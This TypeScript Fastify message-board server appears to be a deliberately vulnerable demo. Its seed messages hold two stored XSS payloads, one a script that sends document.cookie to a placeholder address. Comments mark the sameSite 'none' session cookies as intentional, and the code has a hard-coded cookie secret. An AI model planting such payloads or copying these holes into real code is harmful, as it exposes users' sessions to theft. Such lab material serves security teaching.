import fastify from "fastify";
import fastifyCookie from "@fastify/cookie";
import fastifyFormbody from "@fastify/formbody";

import * as sqlite from "node:sqlite"
import { randomUUID } from "node:crypto";

import { hash, verify } from "argon2";


const db = new sqlite.DatabaseSync(":memory:")

async function initData() {

    db.exec(`
        CREATE TABLE "messages" (
        	"id"	INTEGER NOT NULL UNIQUE,
        	"author"	INTEGER NOT NULL,
        	"date"	TEXT NOT NULL,
        	"content"	TEXT NOT NULL,
        	PRIMARY KEY("id" AUTOINCREMENT)
        );`
    )
    db.exec(`
        CREATE TABLE "users" (
        	"id"	INTEGER NOT NULL UNIQUE,
        	"username"	TEXT NOT NULL UNIQUE,
        	"password"	TEXT NOT NULL,
        	PRIMARY KEY("id" AUTOINCREMENT)
        );`
    )
    db.exec(`
        CREATE TABLE "sessions" (
        	"id"	INTEGER NOT NULL UNIQUE,
        	"session"	TEXT NOT NULL UNIQUE,
        	"user_id"	INTEGER NOT NULL,
        	PRIMARY KEY("id" AUTOINCREMENT)
        );`
    )

    {
        const userStatement = db.prepare(`
            INSERT INTO users(username,password)
            VALUES
                (?, ?)
            ;`
        )

        userStatement.run("user1", await hash("password1"))
        userStatement.run("user2", await hash("password2"))
        userStatement.run("user3", await hash("password3"))
    }

    {
        const dateLocaleString = new Date().toLocaleString("ja")
        const messageStatement = db.prepare(`
            INSERT INTO messages(author, date, content)
            VALUES
                (?, ?, ?)
            `
        )

        messageStatement.run(1, dateLocaleString, "こんにちは")
        messageStatement.run(2, dateLocaleString, "テキスト1")
        messageStatement.run(3, dateLocaleString, "最近暑いですね")
        messageStatement.run(1, dateLocaleString, "ハンバーガー食べたい")
        messageStatement.run(2, dateLocaleString, ">'<img src=x onerror=alert(1)>")
        messageStatement.run(3, dateLocaleString, "<script>fetch('http://10.17.256.512:65536/give_me_your_cookie_bro?s='+document.cookie)</script>")
    }
}

const server = fastify()

server.register(fastifyCookie, {
    secret: "SUPER_SECURE_COOKIE_SIGNETURE",
    hook: "onRequest",
})
server.register(fastifyFormbody)

server.get("/api/messages", async (_request, _reply) => {
    const messages = db
        .prepare(`
            SELECT
                username,
                date,
                content
            FROM
                messages INNER JOIN users
                ON author = users.id
            ORDER BY
                messages.id DESC
            ;`
        )
        .all()

    return messages
})

server.post("/api/register", async (request, reply) => {
    interface IRegister {
        username: string
        password: string
    }

    if (request.cookies.session) {
        reply
            .code(403)
            .send({ "message": "すでにアカウントを作成しています" })
        return
    }

    const { username, password } = request.body as IRegister

    if (!username || !password) {
        reply
            .code(400)
            .send({ "message": "ユーザー名かパスワードが空です" })
    }

    const randomSessionId = randomUUID()

    const { lastInsertRowid: userId } =
        db.prepare(`
            INSERT INTO users(username, password)
            VALUES
                (?, ?)
            ;`
        )
            .run(username, await hash(password))

    db
        .prepare(
            `
            INSERT INTO sessions(session, user_id)
            VALUES
                (?, ?)
            ;`
        )
        .run(randomSessionId, userId)

    reply
        .cookie(
            "session",
            randomSessionId,
            {
                // わざと
                sameSite: "none",
                // これないと動かない
                secure: true,
                path: "/",
                httpOnly: true,
            }
        )
        .redirect("/home.html")
        .send()

    return
})

server.post("/api/login", async (request, reply) => {
    interface ILogin {
        username: string
        password: string
    }

    if (request.cookies.session) {
        reply
            .code(403)
            .send({ "message": "すでにログインしています" })
        return
    }

    const { username, password } = request.body as ILogin

    if (!username || !password) {
        reply
            .code(400)
            .send({ "message": "ユーザー名かパスワードが空です" })
    }

    const user = db
        .prepare(`
            SELECT
                id,
                password
            FROM
                users
            WHERE
                username = ?
            ;`
        )
        .get(username)

    if (!user || !(await verify(user.password as string, password))) {
        reply
            .code(403)
            .send("ユーザー名、もしくはパスワードが正しくありません")
        return
    }

    const randomSessionId = randomUUID()

    db
        .prepare(
            `
                INSERT INTO sessions(session, user_id)
                VALUES
                    (?, ?)
            ;`
        )
        .run(randomSessionId, user.id)

    reply
        .cookie(
            "session",
            randomSessionId,
            {
                // わざと
                sameSite: "none",
                // これないと動かない
                secure: true,
                path: "/",
                httpOnly: true,
            }
        )
        .redirect("/home.html")
        .send()

    return
})

server.get("/api/user", async (request, reply) => {
    console.log(request.cookies)
    if (!request.cookies.session) {
        reply
            .code(401)
            .send("ログインしていません")
        return
    }

    const user = db
        .prepare(`
            SELECT
                username
            FROM
                users
                INNER JOIN
                sessions
                ON users.id = sessions.user_id
            WHERE
                sessions.session = ?
            `
        )
        .get(request.cookies.session)


    if (!user || !user.username) {
        reply
            .code(400)
            .send({ "message": "無効なユーザーです" })
        return
    }

    reply.send({ "username": user.username })
})

server.post("/api/submit_message", async (request, reply) => {
    interface IMessage {
        content: string
    }

    if (!request.cookies.session) {
        reply
            .code(401)
            .send("ログインしていません")
        return
    }

    const currentLocaleString = new Date().toLocaleString("ja")

    const { content } = request.body as IMessage

    if (!content) {
        reply
            .code(400)
            .send({ "message": "内容がないようwwwwwww" })
        return
    }

    const user = db
        .prepare(`
            SELECT
                user_id
            FROM
                sessions
            WHERE
                session = ?
            `
        )
        .get(request.cookies.session)

    if (!user) {
        reply
            .code(401)
            .send("無効なセッションです")
        return
    }

    db
        .prepare(`
            INSERT INTO messages(author, date, content)
            VALUES
                (?, ?, ?)
            `
        )
        .run(user.user_id, currentLocaleString, content || "")

    reply
        .redirect("/home.html")
        .send()
    return
})

server.get("/api/logout", (request, reply) => {
    if (request.cookies.session) {
        db
            .prepare(`
                DELETE FROM
                    sessions
                WHERE
                    session = ?
                `
            )
            .run(request.cookies.session)
    }

    reply
        .clearCookie("session")
        .redirect("/")
    return
})


await initData()

server.listen({ port: 80, host: "0.0.0.0" }, (err, address) => {
    if (err) {
        console.error(err)
        process.exit(1)
    }

    console.log(`server started at ${address}`)
})
